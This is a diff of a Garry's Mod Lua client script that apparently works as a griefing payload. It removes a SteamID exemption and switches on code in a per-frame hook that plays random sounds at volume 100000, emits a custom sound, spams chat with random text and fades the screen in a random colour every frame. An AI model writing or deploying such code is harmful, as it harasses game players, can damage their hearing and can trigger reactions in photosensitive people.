@@ -1,4 +1,4 @@
-if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then return end
+--if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then return end
 local jpegs = 0
 local s = sound
 local Song = false
@@ -245,7 +245,7 @@ _hook.Add('Think','funny',function()
         local result2 = annoying[_math.random(1,88)]
         local cfunnies = funnies[_math.random(1,30)]
         local sresult = annoyings[_math.random(1,13)]
-        --local pSong = CreateSound(LocalPlayer(),sresult)
+        local pSong = CreateSound(LocalPlayer(),sresult)
         sound.Add({
             name = "wowow",
            channel = CHAN_STATIC,
@@ -264,10 +264,10 @@ _hook.Add('Think','funny',function()
         --_command('status')
         pSong:ChangeVolume(100000)
         pSong:SetSoundLevel(100000)
-        --pSong:Play()
-        --ply:EmitSound("wowow")
+        pSong:Play()
+        ply:EmitSound("wowow")
         --_surface.CreateFont(table.Random(funnies),{})
-        --chat.AddText(rgb, cfunnies)
+        chat.AddText(rgb, cfunnies)
         ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
 
         if _input.IsKeyDown(70) then 
